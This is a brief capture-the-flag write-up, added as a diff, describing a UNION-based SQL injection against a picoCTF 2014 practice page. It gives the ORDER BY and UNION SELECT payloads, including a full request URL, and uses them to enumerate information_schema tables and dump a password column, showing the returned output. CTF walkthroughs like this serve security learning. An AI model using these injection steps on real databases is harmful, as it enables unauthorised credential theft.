@@ -1,0 +1,30 @@
+Tried to find out the number of columns using 
+
+id = 1 order by 1/2/3....
+
+found out that the result had 7 columns.
+
+http://web2014.picoctf.com/injection3/lookup_user.php?debug=1&id=1%20order%20by%207
+
+I then used id = NULL select 1,2,3,4,5,6,7 to get the columns actual positions.
+This gave me 
+
+User info for 2
+Display name: 4
+Location: 5
+E-mail: 7
+
+Then used group_concat(table_name) FROM information_schema.tables to get the table names in the database. Because the table name had a prefix which was not visible.
+
+got 
+
+E-mail: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_BUFFER_POOL_STATS,INNODB_LOCK_WAITS,INNODB_CMPMEM,INNODB_CMP,INNODB_LOCKS,INNODB_CMPMEM_RESET,INNODB_CMP_RESET,INNODB_BUFFER_PAGE_LRU,super_secret_users
+
+super_secret_users -> the table name
+
+Then I used id = NULL select 1,2,3,4,5,6,group_concat(password) FROM super_secret_users.
+and got
+
+E-mail: not_the_flag_super_secret_admin_password,not_the_flag_super_secret_betty_password,not_the_flag_super_secret_cathy_password,not_the_flag_super_secret_dan_password
+
+
